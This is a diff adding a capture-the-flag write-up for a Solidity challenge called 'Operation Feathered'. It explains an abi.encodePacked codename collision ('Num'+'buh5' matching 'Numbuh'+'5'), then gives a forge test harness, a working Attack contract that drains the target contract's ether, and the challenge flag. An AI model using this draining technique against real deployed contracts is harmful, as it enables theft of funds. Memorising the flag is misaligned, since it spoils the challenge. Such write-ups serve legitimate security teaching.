@@ -1,5 +1,9 @@
+# Operation Feathered
 
+## Challenge 
 
+The challenge is based on the ParadigmCTF framework. The description can be found in "./description.md".
+We receive the setup as well as the pigeon contract.
 
 ## Analysis
 
@@ -7,7 +11,6 @@
 - pigeons have to fulfill tasks to increase their points
 
 ### Functions
-
 #### constructor()
 
 sets owner and values for the promotions
@@ -64,11 +67,137 @@ reverts if:
 functionality:
 - add a pigeon of arbitrary rank
 
+## Debugging
+To make it easier to debug i used my  [ParadigmCTF Debug Template](https://github.com/J4X-98/SolidityCTFToolkit/blob/main/forge/paradigmTester.sol) which uses forge. I adapted it to fit the challenge and was able to debug pretty efficiently:
+
+```solidity
+// Description:
+// A forge testcase which you cam use to easily debug challenges that were built using the Paradigm CTF framework.
+
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8;
+
+import "forge-std/Test.sol";
+import "../src/Pigeon.sol";
+import "../src/Attack.sol";
+//Import all needed contracts here (they are usually stored in /src in your foundry directory)
+
+contract ParadigmTest is Test {
+    address deployer = makeAddr("deployer");
+    address attacker = makeAddr("attacker");
+    //Initialize any additional needed variables here
+    Pigeon public pigeon;
+
+    function setUp() public {
+        vm.deal(deployer, 1337 ether);
+        vm.startPrank(deployer);
+
+        //Copy all code from the Setup.sol constructor() function into here
+        pigeon = new Pigeon();
+
+        // Junior Pigeons
+        pigeon.assignPigeon("Numbuh", "6", address(0x006), 0);
+        pigeon.assignPigeon{value: 5e18}("Numbuh", "5", address(0x005), 0);
+
+        pigeon.assignPigeon("Numbuh", "4", address(0x004), 1);
+        pigeon.assignPigeon{value: 10e18}("Numbuh", "3", address(0x003), 1);
+
+        pigeon.assignPigeon("Numbuh", "2", address(0x002), 2);
+        pigeon.assignPigeon{value: 15e18}("Numbuh", "1", address(0x001), 2);
+
+        vm.stopPrank();
+    }
+
+    function test() public {
+        vm.deal(attacker, 5 ether); //30 eth are the standard for the paradigm framework, but could be configured differently
+        vm.startPrank(attacker);
+
+        //Code your solution here
+        Attack atk = new Attack(address(pigeon));
+
+        atk.attack();
+
+        vm.stopPrank();
+        
+        assertEq(isSolved(), true);
+    }
+
+    function isSolved() public view returns (bool) {
+        //Copy the content of the isSolved() function from the Setup.sol contract here (maybe needs adaption is it includes msg.sender, then just change it to the attacker variable)
+        return attacker.balance >= 34 ether && address(pigeon).balance == 0 ether;
+        return false;
+    }
+}
+```
+
 ## Solution
 
 ### What do we need to achieve?
 address(msg.sender).balance >= 34 ether && address(pigeon).balance == 0 ether;
 
-We only need to get the money of the 0 tier pigeon, as we already have 30 eth. Then we just need the contract to lose all other money.
+So we need to empty out the whole contract and get all the pigeons money.
 
-### Step 1. Get money of the juniorpigeon
+### What's the problem
+
+In the becomeAPigeon(), we only check for the exact combination of name & code to protect against double use. So we check for "Numbuh" and "6" not being used again. The problem is that as the 2 strings get concatenated and hashed afterward to create the codename, you can just generate the same codename from a different combination of the strings, like "Numb" and "uh6". 
+
+When you know this it gets pretty easy, you just overwrite the pigeons one by one while increasing your points using the task function. This function seems a bit complicated at the start but is pretty easy after ignoring all the irrelevant stuff inside it.
+
+### Solve Script
+
+To solve the challenge I wrote a Attack contract that does everything for me:
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.17;
+
+import "./Pigeon.sol";
+
+contract Attack {
+    Pigeon target;
+
+    constructor(address _target) 
+    {
+        
+        target = Pigeon(_target);
+    }
+
+    function attack() public
+    {
+        //so we are able to achieve the task points afterwards
+        bytes32 codename1 = keccak256(abi.encodePacked("Numbuh", "5"));
+        bytes32 codename2 = keccak256(abi.encodePacked("Numbuh", "3"));
+        bytes32 codename3 = keccak256(abi.encodePacked("Numbuh", "1"));
+
+        //get the money of the first pigeon by overwritting the juniorPigeon[Codename]
+        target.becomeAPigeon("Num", "buh5");
+        target.flyAway(codename1, 0);
+
+        //Send all the money to the attacker
+        msg.sender.call{value: address(this).balance}("");
+
+        //upgrade
+        target.task(codename1, msg.sender, msg.sender.balance);
+        target.promotion(codename1, 1, "Num", "buh3");
+        target.flyAway(codename2, 1);
+
+        //Send all the money to the attacker
+        msg.sender.call{value: address(this).balance}("");
+
+        target.task(codename2, msg.sender, msg.sender.balance);
+        target.promotion(codename2, 2, "Num", "buh1");
+        target.flyAway(codename3, 2);
+
+        //Send all the money to the attacker
+        msg.sender.call{value: address(this).balance}("");
+    }
+
+    receive() payable external
+    {
+
+    }
+}
+```
+
+SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}
